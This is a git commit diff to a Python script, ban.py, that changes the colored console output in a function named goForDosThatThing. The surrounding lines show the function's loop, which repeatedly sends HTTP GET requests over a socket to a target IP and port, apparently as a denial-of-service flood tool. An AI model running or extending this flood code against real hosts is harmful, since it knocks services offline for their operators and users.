b06040b8a8270e4acdb0b3b2631796a29d66de43
Kun-fy <kosakatakun@gmail.com>
2026-02-10 12:47:17 +0700

    Update ban.py

--- ban.py
+++ ban.py
@@ -69,9 +69,9 @@ def goForDosThatThing():
                     try:
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(Colors.BOLD + Colors.CYAN + "Sent packet  " + Colors.BLUE + str(Count.packetCounter) + Colors.MAGENTA + "  Get  " + Colors.WHITE + str(ip))
+                        print(Colors.BOLD + Colors.CYAN + "Sent packet  " + Colors.FAIL + str(Count.packetCounter) + Colors.MAGENTA + "Loading-Get :>" + Colors.WHITE + str(ip))
                         Count.packetCounter = Count.packetCounter + 1
-                        print(Colors.BOLD + Colors.BOLD + "DD-mm-YY-H and Time :> " + Colors.WARNING + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
+                        print(Colors.BOLD + Colors.BOLD + "DD-mm-YY-H :> " + Colors.WARNING + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + Colors.OKGREEN + "")
                     except socket.error:
                         print(Colors.WARNING + "ERROR, please check the host!")
                     except KeyboardInterrupt:
